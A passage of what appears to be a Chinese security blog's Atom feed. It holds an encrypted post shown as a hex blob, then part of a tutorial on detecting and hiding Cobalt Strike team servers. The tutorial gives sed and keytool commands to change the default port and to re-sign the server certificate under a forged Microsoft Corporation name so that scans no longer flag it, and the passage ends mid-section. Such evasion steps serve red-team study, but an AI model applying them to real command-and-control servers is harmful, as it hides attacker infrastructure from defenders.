a844d852ce52d1f133c6565077cf31c4dc6aef5e1ff395254b91e73a9ca0637e7b693f94bc68181b988d16548599330cfee507275506a08219968d112a38e24a0bbb7b8cb38cb18e2316b9520a9514bd022d3490dc9d81b45f067290c0786235f2ecac7e6632b00f76ef6f978c5c4e2ce9b63819969e8474551ba8a5c9f240afbe35d784d1257ef2ec10c58ead40647aef74a5f17f02d310eb8545876a8f2ce09f844d387fa3b6b838e5c7a32454c91b3331dd57d2ce47399c4c5447dadab49370770233185385ecff86e7fd8b2e351b12346330b1b6fd7597f9c6d659dee7af3d58833471f3910419fc4030633de0025da4dd4cc58f97829ff029e6e57dd56d73fd4d7604a6e368a4c491b648e9cecd98181ec47912dab89f692e1947b2174e475e1787ac9cf82f9042c14dd4bb152c069a6b6a08b2436aac5092e966d4b1f8e9bca5359b8ba2cb66c1e345fc65ac15a9ebb20e80ec7b66574a6e6f616070b50c4fc8ad643018dad0c469243d6c6d91a69b13f8c513575c93a9fe5dcca6d02a665f5dcf8940a8ca88c431a6a4da81b83c197e99a52308d0c8a39a31dee93e402cb575d1d34361cf1cc06b9007d9393ef20d52ac961935f5a69256243a78234c0fc10deaef695c7dd0e23049b01223e10293fdad398ecdbca3c7b2dc2741d24bb699e9ba3c273be350cf9e375a2fe8e8be9235257821c5aaf7c3663ecc29f284f07167f8dcd15e211b4ad79e0de912022fee2873a5ad0126091281fa4c2a284a2976b0dd1f03301922944a1cbf65d4d9e08ef106bf30d60177ca0d60a3baee575bab81d7ac394de17b240961ba27bd3eccc922821311cb487cf2d35ff42c936ca999c896e2b8f01bf3524a5f1804cf6751a959e051036066b9bae370c227e9ba45000e90d416584dd0a5c7bafcd704c453cf1e5c5ae1dbe10ca7814eb92d5439598c9f1a717fe96c67a7466ee910bde452152cf23e16311e8e5309adbd55a2433444fa33ae65e5f20744f635d2efab8bad5c0db4880eb6671e45176c8b4ce72fddc5d0354c75df81c08f62720aeee93cf27f25a4200c1c8137ecd619105c172b4a36be562b7f6f2d1b49199fb2d871f0707c2d430994ab2b4e5e6e5301f9057e6c3c4bcd64183c9fb2ec743ac00ff6872fcd6501e8b8d00dd4ed30c2031522feee8eef717dd3f51218f5e46146e1e5d7852175b47fb0c30f2daf9636e3c1205d7bb6fc57fabc16507a0b18c8a9de71467aa92d77acd9b77adea08b2b9a5a24373d9ef6238bc1a67edf3d83c034d53a0726fbabdad9c07c22ff245169b49421880ffc754ef06115b7f6e9eae3d18c963cb397047f359c1c1ea4ba02c6ee349cd18df4cce962cede728c94852c8dd78f107f88e1405a90c03a4ad5ff83eb1e064dc1af8583a2bc2a8f40f44e92e20f1ca7f68f9a4ea4da961c1ddc1cb22c448fa78c7133d3669670cde47c0b6030071ae6d273b87c33c22d6a76bde0d672c617c48c999ea0bafef6c88a92f06d6d6a6d4b92b9b06916b9f1f5e3500ec0083c95d42ff3ae7692cdf1e741e7c773c0f5fecac370f8393868b920ef32f58a3140ba095c505912517299a83455565fbd91470fe552ffa94ad0c15171d131e8f333eadd01db37f0145ebd579a398fc3af923333c581a2ef3abfc896f24bfeab0e3f22c9b6f9d10092cc2788445e102ac5baf0be4010fc2552e67f729a68ab1be4ec79c86ee022387e550e17615d01ea216e7229915b6ec96d3a26151d3b62132ecaebf3ae40d283bc41f5a2a43847c2137e9907c505016f723c0f9c78a0aea8d2750f594ee05429d9fe2e4f85ffa2c93566540853b65aa0a69c609f6a4194c7782f16c88d6f9481ef6b00b7d72dd4affc747b6b755cf299684441aff3032b0c30428f7e90d5e7c545ac2694c2759ac0945381ccd68854926e1c7e3bbae2b9ff99c85383640d08fbd2d1eaa9f7e07da7de1a614b377156f224f694be57f833dc1c5108fa96f0770191c4f88ec8ba0c3ec86fb029ec8d5d81cf2f63297e565e3325bc270eed70db970bb51d280fb53f9ce2773f5e1449b3bf16a5507b3eb5d2e166f88b8d289f070a726a503a2f7a3721839d4f50bbc00ca6459aad08e0ddbff4f6fc53d288d57b64041432f3f0ec65f77c3befb7eabcad6c99c893aee266b7aaeec323c1326943feef5580a12269b9e1a6146fbb91e44375079fabf96fa9a71332eaecf4cce7dbe0969cd5f6064019269719c29b082fb4744240c6d5cfa32f47ac23a96386c96db92deba28ee0b0976665edd1a609b998cd92c5aa0be88751516ff0837eb2da77b72718ad84fee7c88ca595f4eeeef139ebfae345d81a5fbe8da214393d0729165a85b78ff7452e65e7fb9d91e565ad328ec8ffcdd93a3c6db517c395f679e29aa61874c48ae1f0b88ae3cfd5c8de304305aecc35e4e5288935f6fc4c6f9bb7b950fc3d39dfc213df3436c6636a8c561e50590457a9246e328ac9aa4829384ec4545650159a7f2ff772a3a538e8953c2dec780f16741b627ff2b70684df96d60687214eaa6ee91b0eb3efa4a3e5f6ac25def1aa7f1c854af98e747c71c7bfd778f6b7eeb9e465ab28a7d517137ae535fdfba21efbc04879c88270b036e438a57265a0c943c26a348e2116ae150ac2d3e58c46420a57285f1f5cb278969b61efc6467f57e73006e5adaec451da011b6181500e6a4fa3babe9945a681d8ac7293f22fb1aef42988b28bf004f7db206f53974296344010237d0507658a751370402c8b3d46ac8b0e3e00a33f30a0a238cc06ec57585502cef2f96bc9c9f1c8655050e28ad47d5dcaa593035c8d817cceb62e5081e121c283d938129697280630e977729d5b9c86dd430b6cf349945799f4ead08f42713fa1d9e83a7b7ed7f49e8f84c10039b01e58a3a3083fe6c6acc434054ffeaceaf702f637e106324d9095f995259f12018628ede3ca1a8a5712ad3a6681fa31e856ced4db2877cef8f4721db51cc56c75d523b69b6db0423da96a37877f7d6157355d219430255c450d3fc46d63699a9fa0f0fd6e91608e5573bc0125d0fc13b3c85a63f465a2cec2de50dd1f48b8993b70dd136b28c8b66a9dad3ab571a6ce997c46ce3615821bf6ae3426c5e59b867cefc1f9da1e5e848a848bab5c50042a4dae34b82df08b8b773a524a69134e74b2ecdb9c34d1e8e35b00d791101a33866e449eca2a93918b0b4da42245cfed99407f8f0bcbee18f9d4e34236cef60429ecb78f78e5049d7682f03892a57e448fb118cbdd87821a97fc4ce4008732755bc81666a79a8547c5e79cce01ca3150455df00a817e581630820601b21eb39c72ed52ffed055eff4694df29800ed1c5e31def2d9e7870162878215821bffa4597605335b007a5ccc4cbb1c49b3082cbc65c25d3bcdb0a320c3496755af74fcb1572769bf3457e7d9b758f9942f1bb91ab78070a5a095e28dbe540ec76f69806956ba039aa7d3443bf2dd164680da903c0c896d02e53ef00c577f27e147fa2a48820ffeae5b9252fdbe66efc34ebd48a4d1b399e51d8a011d327f915488a1546315f9425c955df6bdfc0e5a4859ffd31143114c896c7ad9ac67aa852c83aa582138bba1499dd92b4d03b29c2d8ee5cb59755e187e1c3556ae9b6d8aed117c85b16b2d1140310ca7ee42aab2b0d3f48261f34ca71fd3807e94e3f835ea728c7e8b8d20bc56b4734268cd388cbae3cb5316e13e3b33a7ee79a5c1cb760458ff8f54018414a708a48cbdbcc9866718551517ba47a26d9d138dd0c51f46aa4de59584387a3e7ed8ee6d04f658f4eea68bec8aa1c1ec8ea224240baf7af90758f02a785d5672697486dcf2bfee0547412f64b453220213536db4b91c1b7d2aafc031f11fc2306f7add501b88556d4aa9a3115a86c6f7d28829a3784e346f95507d777942b59e7d1e6553eac74da99f25802216fa144cb5281b7806afae5f18b772682c1cebbd850b41af96e4e16d90c3b087b742f7760e505467ca752b85c8b0e750efdb2ded2cb63416c5c66ab7928182bf28631c35dbcdb011761eed497271b573d203a2b3254bc0092b6c46d5ef46f06d309813f6660288f4edd01fa89fb224f00ec337698fb1c77f83183a23c661f02289cb7d2a7a63859bf76f9b27ab3b58762aa2819e027e7e8b60feb5826a868b75fdfe5cca522e5ffb19119ecae6cdbe8c59d444dddecb091d7293d297a40f4568a059dea0da8d139ab90620cc01ea2440aca6a7d7a8243f50d399e69f74e476b7356bed9fc96dcbd01e411869209a8be451eda085d5a2a0c4d4b881ebb8edf667b7c5c6ddd2fbafc376a056160a40293a62c6a1b9d60d777880587a9dcb8924ddc4ab7f264214dc08e7b2a8cb14aea2afbcdccef760923f0dbcaeebf6a5c3582ba5565bcecc17cc12de1fb0ff1bbcb4686b8e95c0b7dfb9d5bb54de1fa286bc93d4857da88d80c831ede57826564bcbdf5560463b4c78c076cad733dfe08b2cd6306a5eeb6ca91ee1e1668959a333ff550e5926bddfcef703f141b0b2a9a7d3a62c56e05aab5c967c55e699562c989e4e511a39e575ad3ba0122506fee00aab71166443782d2ab990f64b9b947db8e03ded92a357dc5591c07696c0f5b7195e82da831b1a1673851fd178377445e5504567da684f8c3e8988465123994f944609eff89ba002e15c5f39fbee25baace181987f22ba5a64c71de131dcbd5a0c1eef0746c95cb4390d5aa0de20db876ac52caa0eb2b74f6b42d1b4e524ad47de7aaeed07a637b2066d9bad1a9d47960f682876a2121d611782d21cae30727c38ede681a4029aa101544307242de627395db06abc8cdaa2ebdb425e0c77b95e4892475dbcabf78702a59f3e21d3ad40af29bfb0cba05ac06191b5183eabc8ae65528aaa9d1d20901cc074d4c7ab7b0d6595427b34ee70fd9b41c4087266979893661de4bf09553b32d64ef021533b0915ebc9f913f8d2c468809c7a59ef09d4d66b95faabb2c22d0116bc891e96a9f67e544c92e6198723da6ee833d2b72a519197c4e0ba149d6cab4851414cdfcbd7a7401b9c852b91f54159a0eccd0f87cf6453d26e36b61d2d56a179a298c9b4448a0b714477e827901d630df5c08d0c87454935562121f9053fda11cb7f2b8497c0268b249faeb48e4112d706394103855afe17860d4c0a43615bea7cbb1bd5a1763caadf9e5351c92fc4b9dc7982b349ac1dbfe64069c1246d29cfcd95a8edbf30b7da903944d7f7652d47eadca0fb6040edcaf5ccce60b6d988619883eda5782629b58af4e7c835e54532948767801d591c6b31081c5702d247eb51426ef9aa54a237297a62c01865b26695cf5951861ff9b7c5b9ed257a2a03212fea10c5fb0eb1a1a871e02112626e1351736206e11ce944832ec6d4d02ca907e732fdd23efa6fca2467ede1869d4b107fe12770d18f1a851ba49af493ab2988eb9af65f49d28734fdc5ce3fe0b768e924ddd7361e6e42ec4d0afc50d865b86f09b460552ca9e336e043f4d37e1740812a7768454690927b9b515592f8bff7fc2d73d28c6fe39a2cd1c4455a4c610442ae3f906c0234b001d047fdd8a8188894081e918f6de515116813b5af1c8a43a6188b2133d368f5ec9cc2b76e81f479d0e1f5f782f4090ffe069aae6eb7f906224d10acbd2c2dd40d4a04c21705e6f2bec1e684eea79d0db5143a927402910278d1a65e4928d18adb5e8fa8a50ef1a84f3fe73093b7c3e2458d661cc984e417530d05886aa1a3f3463d311151e4524fe23a7d3ed645d3527e687ce6297760364023c8af05c2e5f519fa3897947c2977931d2283117c2aee4d2ff37cfcd359d6cd9727b36a66a41a7d68ca246c7dbeec8f990dcf021b473543354344e8c5b4ba63299aec26ea87789b08b5c52cb5c05f3be01e22213ecadc00e426cb543f2b1c4a385fe0b08d0f02b3ec62004834ce29c223f2745c2af223410a2b7f7b34f5d0d1b50bbe607d20491173fceaf19f8b1ee71c864c3703b0a207b252c6368bfd966a1e293dfce665130a01eeaf051d59b7faf3c5674d4cf35ec62a83e73babb9ba037ba7c28372efb4d2a6097cb0d26c1ee569a2dc2fd844797cf6d5885fc0ebb84d62875b3d69d615d954529d3e5f2c3bf586f75d8fd991057477bdf3071bdc08d5d60eee65c4965f8eefa8662cfc1434db5b827b65b03a411f2d56b3bdc7e27eba8a841cc4db4b5986eed0d19b623588bcc285ecb2142e0392a1d30275001e910789e5c6f41aede500c9479399116cedf027cb647e26ecdcb4b61856625341ed17a2f833d55cf378538db99276e2de7322f635db9f93722542f894333ec49a661796c922b2f13d43816e513367afaad3f28955822837447df295d603dd840e9a13c386191d89e7dc6a75c7461f28594bd11323e8ebcb1495a455c47f621cc8e34b9894742edf81af6f885cbd1719ba66f7795b238dfdf73e4d8de986b4243c6537d54b66407f5ce236aeeb39b919168a47d511b08671d71edff4d0f13fad670013a9022e6b49ffdfb386f72552cd36c8320d2956af884e34c3f58f9c99198977c1c8a790c50ebb622091ef8fdbb1dbe0d1cfbc91f462d5e4317e7b70302b18c2636143efd26b8b8cfcfb7d8e11b9c31a86a4bda12b6c28fbdaa3627015f0e105a80a4e632542c9ffce7f54080ff59fad00731f2f52eeec09ec41afe7e8931053c472ad8a0055ecc7865fcf641abe9abdd61bf3100b9aee658735fb07e12760218c610bd6ea25b0588d6b79f9547c6bb0c9ccffe4991856903e07f82464035e86ba1004b6af8b29a4cfdd33d0831f911862cdf4dcf764853958fc6257f4122f009016215d18628820e8ae05aef7ee87a164b41467affda9ce9a8c5ae3847aa612d0405c57192cd31cc9d9229a790fd7b92cb3468a1f0ef0e8873a6fac0b37a2d1c311da0a78f1eda9017951291210c9358eee05b341475e8b7da79b5904e9f0d177d555a95654bdff0f1e1b2d2f69fba10475d1a88404ef30ad2000006ab4580feed2d7326c5dd03793e8f9bc767a5be12e2e4ecbcc0c93ce25a1fa3acf4496b68073f586464c3331d73a005c765e93ec9984a092599a1ece8afed15114c30a96d3126f09408c9de224e67786bbf26d38462dd4103318d411b2608c0e80269c976399487affd7d6427c3647f6910a5069af79b9c22f2e9afcfba02474eb03a696ab228353aec4423a284feeec4670af966838bd52c8b0a0bb8b496016e014855e917f003ec9405af622605e49a6e68e37915760e680b916cd1f0dd85389faba3b1e1424df4a8385676c1398aaf3348829bf16edbddabfa4a0c5e328746f180d4fb871dfd6121d234ab6694efce64e4c1fab8166c34362fed43baacc31e29dc8a0204de527b6fb2645bd00480527db6cc16f0d72721b05b9798e86a1a3b284c5d6be3a0ffbfeaaceb2c9209a17f0e38f5ae767bf425eea90604158ba0b8264e81ccf63b561a39ba3a0d0e69cc1ac109ceaf938a42c822eb4e68b33cfdd5e3061a3372b97616841dcff3e926353f0376bfe4b0bcf8c2068e5a82922f1e9a0e1409a9d03c432e42d5b6396ddc8b9696a64b4f63d87d33005d12140abea263281129898df1d81780e0fd945ec3fca0abb2745e16895a9dbd44ac1c979232fd396cddc7f3851f7aa965d9d37f0a12ca811daca503b63e11125df2ae19c57ca2822092ac42b57f536471f4de2ac230a86f5962bc80b8561645b3b2b6a7b753170fd3d9a51cdbc91b262aa47a30fd2deab0806c2930300495c53aec980d128501b4f428d7147ae8d8c87f15282d341531db026304ee78c46770342e3b724a65ca56eba6394fb5a0c580713efc87d17e501b8cdddc965221c968c2b3e58555a28051f9b4a5d19065c9220fe9aeac1922cd47811bd49596e476dccbe2e646dbe7ebcc602fbdfa18f2f2d6df3f977fdf18f7d85013f955cd4c1a7a1c47d96dc3bfb7407cf5be8c40beaa1c77cbb6c2b7263cc317937128b63dcb8cff529abf331f322b18d4d8b38d941efba22951170b7a3aa45eacffdc56740e318310b02d32e14d5363eec3dbcbd56f39c46760ab86b255026096c5f0b3de9fde1c244a8a1a68b1dc2a0ac0126f46aa68fcf7176a6d87c800c50cfb818a84397f2d5f6ca0f68d535a6d39d08787f8bb8a4cd47899792e3e91111fc2f11872a9546ff2f32579fdb0e2c5d1956e08c07ca53ceb62ef33c362a642af0ff1c5fa14587b9fbcc3bc2a17676ff0c8c8a304397a6e619d2c1aee1ba3549a741443494b62dc82945907db83c2c46e48678ded70265617871c9144281cd81d37cdb4f3c4c974ce6c27a4a541200ec8643ae525a01634ac0bba053fccf71a1d0687f49ff6ed6a03127b34dc1bc2011012e5ce86e2d487df9cac5a779f4f42f969ef2aea037624ff5b9cb1948d198344cd197b423478696dffde3fcb425179381c694bb6d825f5d953cf5653ea481ef812af411a329f4aad849f5a7bb1f3e51532eed3dbceb9ad77244f7f4e671b2ac7d05e54004bd8aa89566c195412ca614a30162ab9ff2a165df82ad6886f1d0ebf9845db061184985202f6e70da13e8a683490fbe155da9b6b01edfb664f8bc01f84ca96743f68757830a453d5ce2bc403874ca272bb974963a31a88b058c8fa954e9d4689d27f38e3ed9b79d5ecccc333beceee0feb1c9baeb61cc0156affe083cee558894cac582472b75a1b5932aae545ec48cee2df39436952230d9adc19c9f77adebfed82843564255dd8fc1e03fac9e89df8309cbe04350a91d62ce4c4b5b6443d515c42fd2a06ee34f98e857715ef4dd9ea5d53c79d8883cdaf6e57f808fca3e7743d76ab18ea622c388ffcdcb5beea2ec08481e217fb774d4ce6fd6651228018822b9120001c51eeaae04a6a5a0a89a943d0b8722a9154ed2e141ac2f48e95d029e94f5c5b45af43e43c6a3b97b4dfee351892f0b73a24861511661889d6c0a25567f336130e03277bf52a8c10f122dd820cc49419eb98a87a2a0e983f4964d4165b1e3cfe8f6e7a2943653fd67bd29684f0103f6d78daad23cb3e8dc95ae8ba1c13b1b8e3323ca38b0211f34222d81154236c500fd09b6805f84c58226d7e65bd48a7b40e05b6d0c50f83b7c1807dc222ca8b8ffdf7fa2c3cc44a65221ec61d2390a1981209000cfebfae59014035e2d6f014dd0451fe7c49348fd1629edbdc2a7cf6a4cc5ba8a9a93ddfe7970c8fcc2bc668abbdc89c180a8572e74a4988c7076eff086ec4c484400f3f08c4767848eb1329522b0aa1ac8c6f9fc7f3a48656b7593391bbabc43e83ab57a2f71d8c9280bfeea06b6ff23a46e132e81da12831046f4dd820ff29d4176c05f8e188474f912c215a3c12dd20098fac2cb43072f48e380c93a3c60a59396ddf64ce124bb947c8d667030a064c167e9e64ff84e686320b4a69e2d6dea9d060756e1b91b82a3b6a09028a4ce715b7c92bbf7696ccd0dcc7f137d863618611f4cb16130ef146d84112dc6b2421de6eea731eeb7d84339afd9233dd3329e62a8d3ff8632e5bac0549f7956bb1058ae3f05efec2a2f9aecd621b312bbbb9e083b42f7bc8dfc24462e72f856ed75c9e043933f9a98e12ac039306b1261210af92752126dfcfa5424285e8d58a6070a5d5fd53ccf9e6523cb7113479c43ffb591d0169df0caaf0fe6524ada505ecdf38f5e18f0cd5d2d38d9afc9d0d849460a63dd79e61dac18a074aa301abf41e921ce9a85d25cf67d4b5b13b336d562340b130442232d1a227b1afd20de4186bd8c073607d1e48b90736d895a71437e83b517164bd87f13bad0e1c3c18bfb61dd30a933756aa2922b239cb62eac79663aab6e28804a2bf7f72e2d33f5e3cab4817b7f9584ed0f6a0f54974d3f43461257a010c82f853f970052b918d800a6f9b3afb87b974cea3d6f60a778a42987bfc19dcfbef66dd76cfb8dd5f0830929b6c572afe1327c76045e32a8daa1690b5ab28444465253a20e6233b339d6b3ec0bb3704cc04e6068e5fa24457c69b5828b8b747a8f9de432ed1a4e991a043949a48d8bff197f6afc9d8d50c63d4a78c70d919e9444e30d53ba7ae52348fee2b0fa3d0c9d2d5b7bfed3f20aec078ae6b2855cb11b823995dc3180a05489359ef7ef3c751774ee3825b6f4c45ea8fa94ed6e22d992d420b12d7ff2bbe9e283f88276c7764272b2e1da45592b331f11ed4f8dfc273bb3e62cb8b5b908c164c6d2ef343e892e5838e3917adb0298466a9fb91e45264643f1c62d29cc3590cdffe605ad28c2d3eea6ad7ab88345b2691dbafa453538330f6d2f9ac8af36ac4fe3f47243f080c96969706ef86f1f38fff4c11659459ab2d8c2daa54333187c24022b1be5cbddd4024d39e22f46cbe9df0873a0fc5e79e20262c7ab443476a6d30027777f41296f97f78c8a75be95b9c1eaa9b29e58288a447f495f5e33d8c5f646c95d8ef851bcdc15b1ae58cc31503906765156a4cb9568b64bc05f61616f00f058b256e47736f171e7b51c57d5ef84af8a3199a0811df94a372921260913e9c92e3bc651515028fafbe38910330dc70df0facb9e39e870ed9203525443305b971fab84245fd0be633fb65492dc4e10f274a4b1031f791651f194d21d74ec5f6c76a6a91e67b592e8d2bb063319ddc577e1a344dec5a789981a99a056029e3e116c212ff477df08390614aec15be317e2e295551d281fbfa12439227f96275bd54b3937803143b99f6328531f59093a2f61290f27bed057a4f8a0cd7f85c9028a647aeaa777790f579497f20e71895adf35902016f82e740ea732fed6a7ee5289196792e2b7c2147b8aece4eef053f45f86880cdbf900f757f940d0c7fbcbe893bec930e0f3bda0aeece0a95f4e908026d33012c25b136884d34cd90e00e8ce853043437a1c7a3cd4a5c01769e60e96055226df327439522a6441cba9279ed5c513a97a8117107bf1d6f18177f95009a8ae64ac2151bb43dac3df66e5caef9858ac1b8bc9e8e186a2052b0bec27ff065899539431f0ab6055004b407721bf3e4cc7a9fc271bfa94f7f6bc490f54eb095763f246733fed3976e809520c12923b0251410d898dd554d223843629614bfc9d629c2e867bcf2b47636ff57d2cf45fd472c0f1863ce37eec6bbcb57fd3434a192225cecccaa85b4bb7606a0ce432de3a416b4f2c43f8a0a4f184fb0fbd6a0528a6f83da38c70456946d8f6656fcb12f91e43ae3b593a056a8eb72a3bf69481d9fd9d9e164be91cb27b43f87c7aac7e763216a1b69859a86f0c839663e4b9bb4b522f0eb7a3bbb1982b90d39fcca91dea0d146000f86889c40b2f5ee69f37f602530cc0ad3bad9207d8e502943044a13d2f5039125f6bbcefc3db466f82e82db073a41227f49455a5a6727de605fe379709d0b3d2a9991dbfd78a2b18af726c6b0573e402530063006fe5a23ec2e53f179ed694ce8fe67e5feaf25f14d2036316080d53fedf2047c9330f179ab662117c68886174bc1face19b0a74b871a6620e89ebb0069ba2aeffe62a93eaf046c8c8ed045d850c7ae77997cd3fe994c760e0d56470cd4fc833f1a91469f70f07695793b3762d3590720e22519c22b01b1d87f67ba3db8c6b939153625fb3c7f623f4949a71f0aea4d539da903368c82dba063e978442a83a5ab54531ef09a80b78679ca0138383476eea5ca4da1710412bf6773bf8d08a0d4e30af25dd66fed469d5431a6867ed961cade5bc32856d714d16f76f016b9c59ab4f0b8ffa7f47692a2504b90411c6cbff02d15c5be9ca3aa48ecfbd209fdff71e094f5e9ce40acf03bcfb17fbe9a2c75cae6953038b2722bf999076ea16d92e8441acf92200ddba08b42d9c2e9b1f0b6ac2108a98b3921121ccc412b345dece54b5d1ebafcf9f301705404b93a8ced872d740cfe564c181ab1998e24a6e031f21747cb26661e1d0758a68b8ef69b9db257d6394ded8d6a5546d8aeac6e7615f2955380ad553c116f35b259622c96c273731f2420407f1b529c36aea4f0ad8b219e2b9cf36dd756c5a9f36215503deff35bdf2117969a2f7023081ac7ca473c7df12031ebffdddc93bfd0981540fa73baba86e3c9654186993012201bd9ad55995a56596d7e83986c024b17810e1f8327ead1cbd184dda97b01d2167fa7333d602fb44489f245f74f290f61a3825bf39a64c79b57a674ffdd587c9da3aeb00932bb1ea85a746124e24015e27c98eca4d0ec755ff0076d9ec984caea57ebcfbb929a35fdce3b2191761f854f4c116f7b2a9ad795dfdd346bc018eee3b3c52f638f7dd7a2828c0a4898ae2305c21538cf3b28172d8626d3a388846b961c83508223347a83f1596c767628340de85aacd839531abaa9f509cc5e619d89f1cf4f36af6d82f799802fe9394f839c87b9b1ae548f7233ce7fe4640a4d3072c0cd257b92dc53139984e63c7fb1f4a38294282ef9cfe8846f586a3995f4509f6e6bc0f19f4075723e953522de648dec4bf452dfb75bce5e3acf18f983952fb5112ce59639082e10b0cc33cb1f1fd9f4ed6efd9f1a9cb05f61990d17f53d5058858e2e88038a84f7d7aa270dbd3ef6a87d8b3f49b9fe43e1a554cad9f6e313b0bb64da33ada7f4427e00339af8bec7a3a27dcc11ee2deae1879725b77fa14a4ba8480d76cb382abe4fd8a52568b54f852b7e5c754b08df43b8a7e6fb7fcb131dad6a780d8f0d5db0236ec7bdd7e578646b2f35d28353e3ce52b8ee5656c1e0c6318631f0e750bab3bfdaaa4d08bf0672368199cca4ab03c0eed9ab57e6283cda77f8ee5c4b7f8f7b66560c4573efa65f2c919aaadcc18323c1712965358d58cafc6b514ed8da52eb175a7d93553a2f35539f405b46ccd90b81297bcec1ed486ec0a34059fd0d5e4078ed68c885a64138c4a6063bf1728c9f9a1467ac8bb7445484d935d83a094551b1ef25ff8430774405a0ca66b821723ded652bd0e713aedeb236e7241cbefdb41da0d80b78546482394216cf9960d8c056e32c6679ff836321722afc45a9643df3a3cc7aa1d281ed5a4f7373be883410b35d9a0cb442906820e775e5bda0c639cc585e4700e2edeb98fd398c2c24bcc3cd41733267c115a41cd0f8be1b8b39eda5027fc3a837a1c4a717081a96c7c1409df15d33e8a4edc047a5d58dfdea3925c6ca4262a3bc741efe39566361b61d4c3340c494a6af3763e21491d23b3756ae812c45de2d9e11881957294ffe2b529d86f9bc49c1501a24b742de947dd776a7038eda87cdec751830084d18d876fbbe3640583c645b2d0772776fdc68f34f7e5a11a9468e3cfef79574154756837f0831d6da013a485224bf867be21f2fb14640930fe0a9015e6c3b0fe6d94700c603362bc6ca33e408316d012e9c0837f4a5ad0dba4f3bc6df9dc855b57ca7ca8cb3e06a0040df3aaf040d3bd98fba33f15cf7febdda04598c0affd4dc8fd4890fb8f9ac7213a34118e9fa9fc23b3dcdb049f89e6e356145b8ddd6a9f333215c11ea8b8ea8cf533b291ca1f66a63eefbc5d77e40a7f7c768440580c1c4c31fcdf821353880c5123dd7b05f2beaa130e91ce8e1d5f3e141fb92ae1026d31d6c2b4aa67aa3136980f104c0f0fa03d6fedd4c675e6708613f62161d362b5095309724b271690e1c68cc4e2b84828544e53f27f59cc79113aed5ad4afb38f2f691dbbac86c43bb9796e798509ae45369cc0040384ec2b47266f9dc34031c9638f4c03012320d0fd71a5b1bf698474191efbb55167177eed8d59f67e78f2c270c90e35d861048596c37d5639e45fc1aa1f95436e99a03c17c378f46f7c448d44f01e85778c5418f41fbece3daadd8d7a0225ff91bf4ef6d037565ac7b854d3f9cae4f6d944a0e54d48690d1d64e4f99b0a12c9dba6b71eb464281b9575c4cfdfb580a36b8617ba543864598ebb40bff5e1fec0849838a3e47150d412d5a9ba54f672931fb1738505fa92c5915597a9538ac9dbcbdf6744bf424dabcaec6905442af2a67167f265a94a9287cf8246e9c5b9caef7f4cf6ed48d930d738565524274ee14aa20f4d008c106f6458d32f57da43d2e1626a35dab3f0019a8f0a405aac14e64aa1994d9be11ad9202ecab2684c9a88d67d4f8afa508d40fd815c7bc53a6f0f5675f24b14b2295803962b692eb11a198aafafe3bd0008011793a148f56547ab13509b23da91f392406fb5354b020590e59898a49395755479e31bd21c257fe4ff11ac029d8411577d2aaa9b52968cf0b515afdda19941d85c611f199f8de8c5b0c13fcc79b82ca75c741d91ff6e7e9eed0e9afdcbfe0307c1217f29c52344f1025b7821933c4c0efe28cd6b2ef808580d3fd620b66f97c49129cac938f886b23632245a2be37b28fe94b7e26fa09a6204e79dc040b3a2d8567</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="reflection" scheme="https://hosch3n.github.io/tags/reflection/"/>
    
    <category term="classloader" scheme="https://hosch3n.github.io/tags/classloader/"/>
    
  </entry>
  
  <entry>
    <title>检测与隐藏Cobaltstrike服务器</title>
    <link href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-12-16T01:38:12.000Z</published>
    <updated>2021-03-22T05:50:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文是对CS服务器检测与隐藏方法的学习总结，介绍检测方法的同时浅析相应隐藏方法的原理，并动手一步一步的修改相应特征值，搭建出一个不易被标记的基础服务器。</p><h2 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h2><p>CS服务器默认监听在50050端口，可以在启动前编辑<code>teamserver</code>文件更改监听端口：</p><p><code>sed -i &#39;s/50050/10080/g&#39; teamserver</code></p><ul><li>至于能不能有一点卵用就见仁见智了，只能说类似于将Tomcat从8080改到9090</li></ul><h2 id="默认证书"><a href="#默认证书" class="headerlink" title="默认证书"></a>默认证书</h2><p>接着进行全端口扫描，看到默认证书中存在CS证书签发者的相关信息，我们可以用keytool重签一个伪造的证书。</p><p><img src="/img/jcyyccss_a.png"></p><p><code>keytool</code>是一个装好JDK就会有的Java证书管理工具，输入命令<code>keytool -list -v -keystore cobaltstrike.store -storepass 123456</code>详细列出证书各条目信息。</p><p><img src="/img/jcyyccss_b.png"></p><p>然后删除默认的并重签一个伪造证书，重启CS后再用<code>nmap -p- -A -vv</code>扫描时已经消除该特征。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm ./cobaltstrike.store</span><br><span class="line">sed -i <span class="string">&#x27;s!-alias cobaltstrike -dname &quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;!-alias microsoft.com -dname &quot;CN=Microsoft Windows, OU=MOPR, O=Microsoft Corporation, L=Redmond, ST=Washington, C=US&quot;!g&#x27;</span> teamserver</span><br></pre></td></tr></table></figure><p><img src="/img/jcyyccss_c.png"></p><h2 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a>HTTPS证书</h2><p>改了远控服务端证书后，抓包可以发现通过HTTPS的Beacon上线机器用的证书并不是同一个，而且同样存在可被识别的固定特征。</p><p><img src="/img/jcyyccss_w.png"></p><p><img src="/img/jcyyccss_x.png"></p><p>可以向<code>Let&#39;s Encrypt</code>申请一个免费证书并打包为keystore，用来替换CS自带的https证书。</p><figure class="highlight 